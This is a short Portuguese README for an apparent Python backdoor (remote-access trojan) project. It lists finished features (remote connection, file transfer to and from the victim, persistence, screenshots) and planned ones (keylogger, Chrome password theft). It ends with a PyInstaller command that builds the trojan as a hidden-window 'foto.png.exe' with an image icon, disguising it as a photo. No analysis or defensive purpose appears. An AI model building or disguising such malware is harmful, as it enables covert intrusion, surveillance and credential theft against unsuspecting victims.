# Backdoor --- ALMOST READY

# O que é uma Backdoor?
Backdoor ou popularmente conhecido como cavalo de tróia, é um tipo de vírus que ao infectar um computador, abre uma porta para o atacante conectar-se ao computador da vítma.

# Objetivos:
- [x] Conexão remota.
- [x] Download arquivos da maquina infectada.
- [x] Upload de arquivos para maquina.
- [x] Persistencia.
- [x] Screenshot.
- [ ] Keylogger
- [ ] Capturar senhas chrome.
- [ ] Localização geográfica.
- [ ] Trocar wallpaper do computador.
- [ ] Programa completo.

# Instalação
  ~$ sudo pip install -r requeriments.txt

# COMPILAR O BACKDOOR

    ~$ pyinstaller -F --clean -w backdoor.py -i icone.png -n foto.png.exe
